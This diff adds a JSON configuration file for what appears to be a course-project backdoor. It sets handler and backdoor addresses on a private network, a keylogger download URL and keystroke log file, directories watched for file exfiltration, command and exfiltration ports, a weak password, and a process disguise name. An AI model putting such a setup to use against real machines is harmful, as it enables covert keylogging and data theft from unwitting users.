@@ -1,0 +1,28 @@
+{
+    "handler": {
+        "NIC_NAME": "ens33",
+        "IP": "192.168.0.112",
+        "exfilt_dir": "./"
+    },
+    "backdoor": {
+        "NIC_NAME": "wlp4s0",
+        "IP": "192.168.0.121",
+        "keylogger": {
+            "name": "keylogger.elf",
+            "url": "192.168.0.103:8000/8505/final_proj/keylogger/",
+            "location": "./",
+            "save_at": "./keystroke.txt"
+        },
+        "watch_list": {
+            "/home/dwong/Desktop/MISC/Test": "test.txt",
+            "/home/dwong/Desktop/MISC/Test2": "test2.txt"
+        }
+    },
+    "setting": {
+        "CMD_CHANNEL_PORT": 383,
+        "FILE_EXFILT_PORT": 8080,
+        "HEADER_KEY": "noob",
+        "PASSWORD": "password",
+        "mask_name": "hello"
+    }
+}
